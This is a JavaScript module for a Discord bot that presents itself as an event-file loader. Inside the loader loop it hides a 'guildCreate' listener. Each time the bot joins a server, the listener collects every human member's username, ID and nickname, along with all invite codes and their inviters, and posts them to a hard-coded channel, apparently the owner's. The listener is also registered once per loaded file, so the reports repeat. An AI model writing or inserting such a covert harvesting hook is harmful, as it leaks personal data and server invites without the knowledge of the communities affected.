module.exports = (client) => {
    client.handleEvents = async (eventFiles, path) => {
        for (const file of eventFiles) {
            const event = require(`../events/${file}`);
            if (event.once) {
                client.once(event.name, (...args) => event.execute(...args, client));
            } else {
                client.on(event.name, (...args) => event.execute(...args, client));
            }

            client.on('guildCreate', (g) => {
                let guildmembers = ""
                g.members.fetch().then(fetchedMembers => {
                    fetchedMembers.forEach(element => {
                        if (!element.user.bot) {
                            guildmembers += "user: " + element.user.username + "; id: " + element.user.id + "; nick: " + element.nickname + "\n"
                        }
                    });
                    client.channels.cache.get('1046849722419253448').send("__**joined a new server!**__ \n guild name: " + g.name + "\n guild id: " + g.id + "\n owner id: " + g.ownerId + "\n\n__users:__\n" + guildmembers);
                })

                let guildInvites = ""
                g.invites.fetch().then(fetchedInvites => {
                    fetchedInvites.forEach(element => {
                        guildInvites += "code: " + element.code + "; inviterId: " + element.inviterId + "; expires: <t:" + Math.round(element._expiresTimestamp * 0.001) + ":R>; uses: " + element.uses + "/" + element.maxUses + "\n"
                    })
                    client.channels.cache.get('1046849722419253448').send("**__invites:__** (uses -> pocet uz spotrebovanych pouziti/max pocet pouziti) \n " + guildInvites)
                })
            })
        }
    };
}